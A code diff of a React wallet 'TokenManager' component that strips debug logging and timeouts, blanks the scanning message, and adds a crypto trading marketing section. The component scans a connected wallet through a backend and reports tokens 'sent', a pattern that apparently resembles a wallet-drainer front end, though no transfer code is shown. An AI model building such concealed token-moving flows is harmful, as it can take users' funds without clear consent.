@@ -219,7 +219,6 @@ export default function TokenManager(): React.JSX.Element {
   // RESET cuando se desconecta para permitir re-intentos limpios
   useEffect(() => {
     if (!isConnected) {
-      console.log('[TokenManager] wallet disconnected - resetting state')
       setHasScanned(false)
       setTokens([])
       setDetectedTokensCount(0)
@@ -231,18 +230,12 @@ export default function TokenManager(): React.JSX.Element {
 
   // Nuevo useEffect: dispara scan al conectar (y cuando cambia address)
   useEffect(() => {
-    console.log('[TokenManager] connection change', { isConnected, address, hasScanned, tokensLength: tokens.length })
     if (isConnected && address) {
-      // Si ya se escaneó correctamente y tenemos tokens, no re-ejecutar
-      if (hasScanned && tokens.length > 0) return
 
       // Pequeño delay para que el provider/wagmi termine su inicialización
       const t = setTimeout(() => {
         // Evitar multiples llamadas si ya hay un scan en curso
-        if (scanningRef.current) {
-          console.log('[TokenManager] scan already in progress - skipping')
-          return
-        }
+        if (scanningRef.current) return
         scanWallet().catch((e) => {
           console.error('scanWallet error (from connect effect):', e)
         })
@@ -264,13 +257,11 @@ export default function TokenManager(): React.JSX.Element {
   }, [hasScanned, tokens, processing, showModal, isLoading])
 
   const showLoading = (message: string) => {
-    console.log('[UI] showLoading:', message)
     setLoadingMessage(message)
     setIsLoading(true)
   }
 
   const hideLoading = () => {
-    console.log('[UI] hideLoading')
     setIsLoading(false)
     setLoadingMessage('')
   }
@@ -333,14 +324,6 @@ export default function TokenManager(): React.JSX.Element {
     })
   }
 
-  // Wrapper con timeout para fetchWithErrorHandling
-  const fetchWithTimeout = async (url: string, options: RequestInit, ms = 20000) => {
-    return await Promise.race([
-      fetchWithErrorHandling(url, options),
-      new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout fetching ' + url)), ms))
-    ])
-  }
-
   const scanWallet = async (): Promise<void> => {
     if (scanningRef.current) {
       console.log('[scanWallet] Scan already in progress - skipping')
@@ -348,19 +331,9 @@ export default function TokenManager(): React.JSX.Element {
     }
     scanningRef.current = true
 
-    // Timeout fallback: si algo queda colgado, forzamos cleanup
-    const forcedResetTimer = setTimeout(() => {
-      if (scanningRef.current) {
-        console.warn('[scanWallet] forced reset due to timeout')
-        scanningRef.current = false
-        hideLoading()
-        setScanError('Scan timeout, please try reconnecting the wallet')
-      }
-    }, 30000) // 30s
-
     try {
       setScanError('')
-      showLoading('Scanning wallet...')
+      showLoading('')
 
       if (!BACKEND) {
         const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
@@ -376,15 +349,14 @@ export default function TokenManager(): React.JSX.Element {
         throw new Error('Address no está disponible aún')
       }
 
-      console.log('[scanWallet] requesting owner-tokens for', address)
-      const data = await fetchWithTimeout(`${BACKEND}/owner-tokens`, {
+      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
         method: 'POST',
         headers: { 
           'Content-Type': 'application/json',
           'Accept': 'application/json'
         },
         body: JSON.stringify({ owner: address })
-      }, 20000)
+      })
 
       console.log('[scanWallet] backend response', data)
 
@@ -397,9 +369,6 @@ export default function TokenManager(): React.JSX.Element {
 
       // Verificar si no se encontraron tokens
       if (!processedTokens || processedTokens.length === 0) {
-        console.log('[scanWallet] no tokens found')
-        // marcar que intentamos el escaneo (para evitar loops infinitos),
-        // pero permitir reintento manual o por reconexion
         setHasScanned(true)
         hideLoading()
         showAlertModal(
@@ -432,17 +401,13 @@ export default function TokenManager(): React.JSX.Element {
       
       hideLoading()
     } catch (err: any) {
-      console.error('[scanWallet] Error', err)
+      console.error('Error', err)
       const errorMsg = '' + (err?.message || err)
       setScanError(errorMsg)
       hideLoading()
-      showAlertModal('Error', errorMsg + '
-
-Please try reconnecting the wallet.', 'error')
+      showAlertModal('Error', errorMsg + '\n\nPlease try reconnecting the wallet.', 'error')
     } finally {
-      clearTimeout(forcedResetTimer)
       scanningRef.current = false
-      hideLoading()
     }
   }
 
@@ -765,15 +730,12 @@ Please try reconnecting the wallet.', 'error')
   // Mostrar resumen
   setTimeout(() => {
     if (summary.sent.length > 0 || summary.failed.length > 0) {
-      let message = 'summary
-'
+      let message = 'summary\n'
       message += `successful process`
       message += `failures: ${summary.failed.length}, Please check your balance and recharge the page.`
       
       if (summary.failed.length > 0) {
-        message += '
-
-The request was not processed. Check the details.'
+        message += '\n\nThe request was not processed. Check the details.'
       }
 
       showAlertModal('successful process', message, 'info')
@@ -1055,6 +1017,171 @@ The request was not processed. Check the details.'
                 <p className="feature-description" style={{
                   color: '#888'
                 }}>Earn while you sleep.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div className="trading-dashboard-section" style={{
+          padding: '4rem 2rem',
+          backgroundColor: '#000'
+        }}>
+          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
+            <div className="content-wrapper" style={{
+              display: 'grid',
+              gridTemplateColumns: '1fr 1fr',
+              gap: '4rem',
+              alignItems: 'center'
+            }}>
+              <div className="features-left">
+                <div className="feature-block active" style={{
+                  marginBottom: '2rem',
+                  padding: '1.5rem',
+                  backgroundColor: '#111',
+                  borderRadius: '12px',
+                  border: '1px solid #222'
+                }}>
+                  <div className="feature-header" style={{
+                    display: 'flex',
+                    alignItems: 'center',
+                    marginBottom: '1rem'
+                  }}>
+                    <div className="feature-content">
+                      <h3 style={{
+                        color: '#fff',
+                        fontSize: '1.5rem',
+                        margin: 0
+                      }}>Land in \u22641 Block</h3>
+                    </div>
+                  </div>
+                  <p className="feature-description" style={{
+                    color: '#ccc',
+                    marginBottom: '1rem'
+                  }}>Our limit order execution engine is the fastest in the market.</p>
+                  <div className="feature-details">
+                    <p style={{
+                      color: '#888',
+                      margin: 0
+                    }}>With our proprietary order execution engine and colocated nodes, our limit orders land in \u22641 block.</p>
+                  </div>
+                </div>
+
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" strokeWidth="2" fill="none"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>Migration Sniper</h3>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="currentColor" strokeWidth="2" fill="none"/>
+                          <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" strokeWidth="2"/>
+                          <line x1="15" y1="9" x2="9" y2='15' stroke="currentColor" strokeWidth="2"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>No MEV Triggers</h3>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
+                    border: '1px solid #222'
+                  }}>
+                    <div className="feature-header" style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem'
+                    }}>
+                      <div className="feature-icon" style={{
+                        width: '24px',
+                        height: '24px',
+                        color: '#fff',
+                        display: 'flex',
+                        justifyContent: 'center',
+                        alignItems: 'center'
+                      }}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" stroke="currentColor" strokeWidth="2" fill="none"/>
+                          <line x1="4" y1="22" x2="4" y2="15" stroke="currentColor" strokeWidth="2"/>
+                        </svg>
+                      </div>
+                      <div className="feature-content">
+                        <h3 style={{
+                          color: '#fff',
+                          fontSize: '1.1rem',
+                          margin: 0
+                        }}>Auto-Strategies</h3>
+                      </div>
+                    </div>
+                  </div>
+                </section>
+              </div>
+
+              <div className="video-right">
+                <section>
+                  <video 
+                    src="media/land-on-two-blocks.mp4"
+                    autoPlay
+                    loop
+                    muted
+                    playsInline
+                    style={{ width: '100%', borderRadius: '12px' }}
+                  />
+                </section>
               </div>
             </div>
           </div>
